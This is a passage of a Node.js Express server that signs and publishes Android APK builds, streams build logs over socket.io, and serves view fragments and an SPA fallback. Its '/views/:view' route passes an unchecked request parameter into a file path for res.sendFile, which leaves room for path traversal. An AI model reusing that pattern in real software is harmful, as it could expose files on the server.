      p.on('error',e=>ko(new Error(`apksigner exec failed: ${e.message}`)));
      p.stderr.on('data',d=>io.emit('buildLog', d.toString()));
      p.on('exit',code=>code!==0?ko(new Error(`apksigner failed (${code})`)):ok());
    }); io.emit('buildLog','✅ APK signed');

    const serverDistDir = distDir;
    io.emit('buildLog', `📁 APK disponible en /dist/${outputName||'app'}.apk`);

    const globalOutputDir = path.join(__dirname, '..', 'Output');
    fs.mkdirSync(globalOutputDir, { recursive: true });
    const globalOutputApk = path.join(globalOutputDir, `${outputName||'app'}.apk`);
    fs.copyFileSync(finalApk, globalOutputApk);
    io.emit('buildLog', `📤 APK copiado a Output: ${globalOutputApk}`);

    io.emit('buildComplete',{ apk:`/dist/${outputName||'app'}.apk` });
    res.json({ success:true, apk:`/dist/${outputName||'app'}.apk` });
  } catch(err) {
    console.error('⛔️ Error in build-apk:',err.stack||err);
    io.emit('buildLog',`❌ ${err.message}`);
    res.status(500).json({ success:false, message: err.message });
  }
});

// Sirve los fragmentos/vistas parciales directamente
app.get('/views/:view', (req, res) => {
  const viewName = req.params.view;
  const viewPath = path.join(publicDir, 'views', viewName);
  res.sendFile(viewPath);
});

// SPA fallback SOLO para rutas sin punto (no archivos)
app.get('*', (req, res, next) => {
  if (req.path.includes('.')) {
    return res.status(404).end();
  } else {
    res.sendFile(path.join(publicDir, 'index.html'));
  }
});

const PORT=process.env.PORT||3000;
server.listen(PORT,'0.0.0.0',()=>console.log(`🚀 Servidor en http://0.0.0.0:${PORT}`));